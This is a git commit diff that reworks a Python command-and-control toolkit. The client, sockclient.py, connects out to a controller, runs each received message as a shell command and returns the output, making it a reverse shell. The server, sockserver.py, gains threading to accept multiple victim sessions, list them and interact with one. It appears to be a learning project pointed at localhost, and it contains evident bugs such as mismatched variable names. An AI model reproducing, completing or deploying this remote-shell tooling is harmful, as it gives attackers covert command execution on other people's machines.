0deb1b6db9d8e0f4c6a0e4bc889b6434f40ec079
Your Name <67557372+Zoogsz@users.noreply.github.com>
2024-04-16 11:11:05 -0500

    more

--- C2/sockclient.py
+++ C2/sockclient.py
@@ -3,55 +3,6 @@ import subprocess
 import os
 import sys
 
-def session_handler():
-    print(f'[+] Connecting to {host_ip}.')
-    sock.connect((host_ip, host_port))
-    print(f'[+] Connected to {host_ip}.')
-    
-    while True:
-        try:
-            message = inbound()
-            # exit handling
-            if message == 'exit':
-                print("[-] The server has terminated connection")
-                sock.close()
-                break
-            #######################
-            # Change directory handling
-            #######################
-            elif message.split(" ")[0] == 'cd':
-                try:
-                    directory = str(message.split(" ") [1])
-                    os.chdir(directory)
-                    cur_dir = os.getcwd()
-                    print(f'[+] Changed to {cur_dir}')
-                    sock.send(cur_dir.encode())
-                except FileNotFoundError:
-                    outbound('Invalid Directory. Try again.')
-                    continue
-            #######################
-            # Display Ascii Message
-            #######################
-            elif message.split(" ")[0] == 'Message':
-                print(message)
-                sock.send("Confirmation".encode())
-            #######################
-            # Basic Command handling
-            #######################
-            else:
-                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                output = command.stdout.read() + command.stderr.read()
-                sock.send(output)
-       
-            ####
-            # Catch and print failures
-            ####
-        except Exception as fail:
-            print(f"[-] Closing ... Exception caught {fail}")
-            sock.close()
-            break
-        
-
 def inbound():
     print('[+] Awaiting response...')
     message = ''
@@ -70,6 +21,49 @@ def outbound(message):
     sock.send(response)
 
 
+
+
+def session_handler():
+    print(f'[+] Connecting to {host_ip}.')
+    sock.connect((host_ip, host_port))
+    print(f'[+] Connected to {host_ip}.')
+    
+    while True:
+        message = inbound()
+        # exit handling
+        if message == 'exit':
+            print("[-] The server has terminated connection")
+            sock.close()
+            break
+        #######################
+        # Change directory handling
+        #######################
+        elif message.split(" ")[0] == 'cd':
+            try:
+                directory = str(message.split(" ") [1])
+                os.chdir(directory)
+                cur_dir = os.getcwd()
+                print(f'[+] Changed to {cur_dir}')
+                outbound(cur_dir)
+            except FileNotFoundError:
+                outbound('Invalid Directory. Try again.')
+                continue
+        elif message  == 'background':
+            pass
+        #######################
+        # Display Ascii Message
+        #######################
+        elif message.split(" ")[0] == 'Message':
+            print(message)
+            sock.send("Confirmation".encode())
+        #######################
+        # Basic Command handling
+        #######################
+        else:
+            command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output = command.stdout.read() + command.stderr.read()
+            sock.send(output)
+        
 
 if __name__ == '__main__':
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
--- C2/sockserver.py
+++ C2/sockserver.py
@@ -1,59 +1,72 @@
 import socket
 import sys
+import threading
 
 
+
+
+def comm_in(targ_id):
+    print('[+] Awaiting response...')
+    response = targ_id.recv(1024).decode()
+    return response
+
+def comm_out(targ_id, message):
+    targ_id.send(message.encode())
+    
+    
+def target_comm(targ_id):
+    while True:
+        message = input('send message#> ')
+        comm_out(targ_id, message)
+        if message == 'exit':
+            targ_id.send(message.encode())
+            targ_id.close()
+            break
+        if message == 'background':
+            break
+        else:
+            response = comm_in(targ_id)
+            if response == 'exit':
+                print('[-] The client has terminated the session.')
+                targ_id.close()
+                break
+            print(response)
 
 def listener_handler():
     # bind to local address
     sock.bind((host_ip, host_port))
     print('[+] Its so quiet')
     sock.listen()
-    remote_target, remote_ip = sock.accept()
-    comm_handler(remote_target, remote_ip)
+    t1 = threading.Thread(target=comm_handler)
+    t1.start()
     
     
-def comm_handler(remote_target, remote_ip):
-    print(f'[+] Connection received from {remote_ip}')
+    
+def comm_handler():
     while True:
+        if kill_flag == 1:
+            break
         try:
-            message = input('Message to send#> ')
-            #exit message handling
-            if message == 'exit':
-                remote_target.send(message.encode())
-                remote_target.close()
-                break
-            # remember that we need to convert the string value of message to bytes using .encode()
-            remote_target.send(message.encode())
-            response = remote_target.recv(1024).decode()
-            print(response)
-        except KeyboardInterrupt:
-            # close out 
-            print("[-] Keyboard interrupt issued")
-            message = 'Exiting due to keyboard interrupt'
-            remote_target.send(message.encode())
-            sock.close()
-            break
-        except Exception as fail:
-            print(f"[-] Closing ... Exception caught {fail}")
-            sock.close()
-            break
-    
+            remote_target, remote_ip = sock.accept()
+            targets.append([remote_target, remote_ip[0]])
+            print(f'[+] Connection received from {remote_ip[0]}\n' + 'Enter command #>', end="")
+        except:
+            pass
 
 
-def comm_in(remote_target):
-    print('[+] Awaiting response...')
-    response = remote_target.recv(1024).decode()
-    return response
 
-def comm_out(remote_target, message):
-    remote_target.send(message.encode())
 
 ################
 # main function
 ################
 
 if __name__ == '__main__':
-
+    
+    #targets list var
+    targets = []
+    
+    # set kill flag
+    kill_flag = 0
     ##############################
     # socket.AF_INET = IPV4 address family used in sockets where we will be referring
     # to socket connections through a host IP and port address scheme (AF_INET6 would refer to IPV6)
@@ -65,12 +78,34 @@ if __name__ == '__main__':
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
-        host_ip = sys.argv[1]
-        host_port = int(sys.argv[2])
+        #host_ip = sys.argv[1]
+        #host_port = int(sys.argv[2])
+        
+        host_ip = '127.0.0.1'
+        host_port = 1337
         # call listener handler
-        listener_handler()
     except IndexError: 
         print('[-] Command line argument(s) missing. Please try again.')
     except Exception as fail:
             print(f"[-] Closing ... Exception caught {fail}")
+            sock.close()
+    listener_handler()
+    while True:
+        try:
+            command = input('Enter command#> ')
+            if command.split(" ")[0] == 'sessions':
+                session_counter = 0
+                if command.split (" ")[1] == '-1':
+                    print('Session' + ' ' * 10 + 'Target')
+                    for target in targets:
+                        print(str(session_counter) + ' ' * 16 + target[1])
+                        session_counter += 1
+                if command.split(" ")[1] == '-i':
+                    num = int(command.split("  ")[2])
+                    tar_id = (targets[num])[0]
+                    target_comm(targ_id)
+        except KeyboardInterrupt:
+            print("\n[-] Keyboard interrupt issued")
+            message = 'Exiting due to keyboard interrupt'
+            remote_target.send(message.encode())
             sock.close()
